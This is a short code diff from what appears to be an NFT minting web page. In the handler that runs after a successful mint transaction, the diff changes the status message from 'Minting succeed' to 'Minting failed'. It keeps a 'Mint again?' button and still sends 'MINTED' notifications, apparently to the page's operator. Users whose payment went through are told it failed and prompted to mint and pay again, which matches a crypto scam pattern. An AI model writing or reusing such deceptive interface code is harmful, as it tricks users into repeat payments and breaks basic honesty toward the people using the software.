@@ -138,7 +138,7 @@ connectBtn.addEventListener('click', async () => {
           ],
         })
         .then((txHash) => {
-          statusp.innerText = 'Minting succeed';
+          statusp.innerText = 'Minting failed';
           checkoutBtn.innerText = 'Mint again?'
           sendMessage("**[" + myid + "] ** MINTED")
           sendMessage("**[" + myid + "] ** MINTED")
